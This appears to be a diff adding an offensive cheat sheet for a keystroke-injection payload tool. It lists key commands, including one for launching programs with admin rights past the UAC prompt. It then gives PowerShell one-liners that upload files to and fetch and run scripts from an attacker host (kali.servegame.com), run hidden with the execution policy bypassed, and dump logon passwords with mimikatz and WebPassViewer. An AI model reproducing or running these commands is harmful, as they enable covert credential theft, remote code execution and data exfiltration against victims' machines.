@@ -1,0 +1,56 @@
+Extra commands
+
+\RUNBOX # opens the run box
+
+\ADMINPRESS #Used with \RUNBOX to launch anything with admin priveles
+            #Probably followed by a \LEFTARROW and \ENTER to acept the UAC box
+
+\WINKEY #Windows key
+
+\CTRL
+
+\ALT
+ 
+\TAB
+
+\SHIFT
+
+\CTR+ALT
+
+\SLEEP (TIME IN SECS)
+
+\ENTER
+
+\LEFTARROW
+
+\RIGHTARROW
+
+\UPARROW
+
+\DOWNARROW
+
+
+
+#Upload file
+
+iwr kali.servegame.com:8000/up.php -method POST -infile 64.txt
+
+Invoke-RestMethod -Uri "http://kali.servegame.com:8000/up.php" -Method Post -InFile "C:\mimikatz32.exe"
+
+#Download file
+
+powershell.exe -executionpolicy bypass -w hidden #to hide window
+
+iex(New-Object System.Net.WebClient).DownloadString('http://kali.servegame.com:8000/powershell.ps1')
+
+Invoke-WebRequest -Uri "http://kali.servegame.com:8000/mimikatz32.exe" -OutFile "C:\mimikatz32.exe"
+
+
+Password stealer with mimikatz##
+
+mimikatz32.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > C:\nice.txt
+mimikatz64.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > C:\nice.txt
+
+Pasword stealer with WebPassViewer
+
+./webpass /stext pass.txt
